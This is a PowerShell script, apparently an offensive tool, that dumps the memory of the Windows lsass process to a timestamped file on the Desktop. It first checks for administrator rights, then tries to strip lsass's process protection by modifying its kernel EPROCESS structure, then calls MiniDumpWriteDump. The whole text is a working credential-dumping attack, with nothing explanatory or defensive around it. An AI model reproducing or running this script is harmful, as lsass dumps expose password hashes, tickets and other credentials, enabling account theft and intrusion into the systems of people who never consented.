Import-Module NativeInteropLib -ErrorAction Stop

Clear-Host

# 1. Ensure Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "[-] This script must be run as an Administrator."
    return
}

# 2. Safely retrieve lsass process
$Proc = [System.Diagnostics.Process]::GetProcessesByName("lsass")
if (-not $Proc) {
    Write-Error "[-] Could not find the lsass process."
    return
}

$Proc     = $Proc[0]
$ProcId   = $Proc.Id
$hProcess = $Proc.Handle

# 3. Handle Eprocess protection modification safely
try {
    $eProc = Query-EprocessStruct -ProcessID $ProcId
    Update-ProcessProtection -Eprocess $eProc -SignerValue None -TypeValue None | Out-Null
} catch {
    Write-Warning "[!] Failed to update process protection. Continuing anyway..."
}

# 4. Generate timestamped dump path
Set-Location ([Environment]::GetFolderPath("Desktop"))
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$dumpPath  = "$PWD\lsass_$timestamp.dmp"
$fs        = [System.IO.File]::Create($dumpPath)

try {
    $Values = $hProcess, $ProcId, ($fs.SafeFileHandle.DangerousGetHandle()), [int32]2, 0L, 0L, 0L
    $success = Invoke-UnmanagedMethod -Dll dbgcore.dll -Function MiniDumpWriteDump -Values $Values -Return bool
    
    if ($success) {
        Write-Host "[+] Successfully dumped lsass to: $dumpPath" -ForegroundColor Green
    } else {
        Write-Error "[-] MiniDumpWriteDump failed."
    }
}
finally {
    if ($fs) { 
        $fs.Close()
        $fs.Dispose()
    }
}